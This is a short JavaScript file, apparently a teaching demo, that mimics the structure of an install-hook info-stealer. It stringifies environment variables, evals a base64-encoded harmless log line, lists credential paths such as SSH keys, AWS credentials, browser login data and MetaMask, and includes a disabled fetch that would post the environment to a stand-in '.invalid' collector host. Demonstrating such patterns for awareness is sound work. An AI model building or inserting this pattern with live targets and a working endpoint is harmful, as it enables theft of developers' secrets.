// SIMULATED. Mimics an info-stealer's structure; every action is harmless.
// Real attacks look similar: an install hook that quietly collects secrets.

// 1) "Collects" all environment variables — here it only checks for a fake demo key.
const snapshot = JSON.stringify(process.env);
const found = snapshot.includes("DEMO_API_KEY");

// 2) Hidden payload: base64 that decodes to a harmless console.log.
const payload = Buffer.from("Y29uc29sZS5sb2coJ1tERUNPWSBERU1PXSBwYXlsb2FkIHdvdWxkIHJ1biBoZXJlJyk=", "base64").toString();
eval(payload);

// 3) Targets a real stealer would look for (never read here).
const TARGETS = ["~/.ssh/id_rsa", "~/.aws/credentials", "Chrome/Default/Login Data", "MetaMask"];

// 4) Exfiltration endpoint — .invalid can never resolve, and the call is disabled anyway.
if (false) fetch("https://collector.example.invalid/upload", { method: "POST", body: snapshot });

console.log(`[DECOY DEMO] setup complete. demo key present: ${found}. targets listed: ${TARGETS.length}`);
